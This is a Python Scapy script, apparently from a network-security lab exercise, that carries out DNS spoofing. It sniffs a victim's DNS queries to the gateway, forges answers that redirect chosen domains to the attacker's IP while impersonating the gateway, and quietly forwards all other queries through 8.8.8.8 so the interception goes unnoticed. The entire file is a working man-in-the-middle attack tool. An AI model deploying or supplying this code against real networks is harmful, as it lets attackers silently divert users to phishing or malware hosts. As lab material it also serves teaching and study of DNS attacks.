#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# DNS SPOOFING TOOL (Task 3 - FINAL FIX)
# Intercepts DNS queries, spoofs selected domains, and forwards non-targets.
# -----------------------------------------------------------------------------
import sys
import os
from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send, sr1

# --- Configuration (Matches lab setup) ---
ATTACKER_IP = "192.168.10.200"
GATEWAY_IP = "192.168.10.1"
VICTIM_IP = "192.168.10.10"
INTERFACE = 'eth0'
SPOOF_FILE = 'spoof_domains.txt'

# --- DNS Forwarding Settings ---
# External, reliable DNS server for forwarding non-spoofed queries
EXTERNAL_DNS_SERVER = '8.8.8.8' 

# Global variable to store domains to spoof
SPOOF_DOMAINS = set()

def load_spoof_list(filepath):
    """Loads target domains from the config file."""
    global SPOOF_DOMAINS
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Store as bytes, appending the dot, as seen in DNS queries
                    SPOOF_DOMAINS.add((line + '.').encode('utf-8'))
        
        if not SPOOF_DOMAINS:
            print(f"[!] Warning: {filepath} is empty. Spoofing is inactive.")
            
        print(f"[*] Loaded {len(SPOOF_DOMAINS)} domain(s) for spoofing.")
        
    except FileNotFoundError:
        sys.exit(f"[!] Error: Spoof list file '{filepath}' not found.")

def dns_spoof_callback(pkt):
    """Callback function executed for every sniffed packet."""
    
    # Check if the packet is a DNS Query from the Victim (qr=0)
    if IP in pkt and UDP in pkt and DNS in pkt and pkt[DNS].qd and pkt[DNS].qr == 0:
        
        query_name = pkt[DNSQR].qname
        
        # --- SPOOFING LOGIC ---
        if query_name in SPOOF_DOMAINS:
            
            print(f"[!] SPOOFING: Intercepted query for {query_name.decode()} from {VICTIM_IP}")
            
            # Craft the forged response
            ip_layer = IP(src=GATEWAY_IP, dst=VICTIM_IP)
            udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
            
            # Answer: DNS Resource Record (DNSRR)
            dns_answer = DNSRR(
                rrname=query_name, 
                type='A',          
                ttl=60,            
                rdata=ATTACKER_IP  # Send Attacker's IP
            )
            
            # DNS Header
            dns_response = DNS(
                id=pkt[DNS].id,      
                qr=1,                # Response flag
                qd=pkt[DNS].qd,      
                an=dns_answer,       
                ancount=1            
            )
            
            send(ip_layer / udp_layer / dns_response, verbose=False)
            print(f"[*] Sent spoofed response: {query_name.decode()} -> {ATTACKER_IP}")

        # --- FORWARDING LOGIC ---
        else:
            # Re-send the query to a real external DNS server (8.8.8.8)
            print(f"[*] FORWARDING: Query for {query_name.decode()} to {EXTERNAL_DNS_SERVER}")

            # 1. Strip the packet down to the DNS layer
            forward_pkt = IP(dst=EXTERNAL_DNS_SERVER) / UDP(sport=pkt[UDP].sport, dport=53) / pkt[DNS]

            # 2. Send the query and wait for the real response (sr1)
            real_response = sr1(forward_pkt, timeout=2, verbose=False)

            if real_response and DNS in real_response and real_response[DNS].qr == 1:
                # 3. Modify the real response to send it back to the Victim
                
                # Copy the answer, but change the IP/UDP headers to look like they came from the Gateway
                real_response[IP].src = GATEWAY_IP
                real_response[IP].dst = VICTIM_IP
                real_response[UDP].sport = 53
                real_response[UDP].dport = pkt[UDP].sport
                
                # Delete checksums for recalculation
                del real_response[IP].chksum
                del real_response[UDP].chksum

                send(real_response, verbose=False)
                print(f"[*] Forwarded real response for {query_name.decode()}")


def main():
    if not os.geteuid() == 0:
        sys.exit("Please run with sudo: sudo ip netns exec attacker python3 dns_spoof.py")

    # 1. Load the target domains
    load_spoof_list(SPOOF_FILE)
    
    print(f"[*] Attacker IP: {ATTACKER_IP}. Spoofed traffic will be redirected here.")
    print(f"[*] Starting DNS sniffer on interface {INTERFACE}. Ready for queries...")

    # 2. Start sniffing for DNS queries on the interface facing the Victim
    try:
        # Filter for DNS queries destined for the Gateway (who the Victim thinks is the DNS server)
        bpf_filter = f"udp and port 53 and dst host {GATEWAY_IP}"
        sniff(filter=bpf_filter, iface=INTERFACE, prn=dns_spoof_callback, store=0)
    except Exception as e:
        print(f"[!] An error occurred during sniffing: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
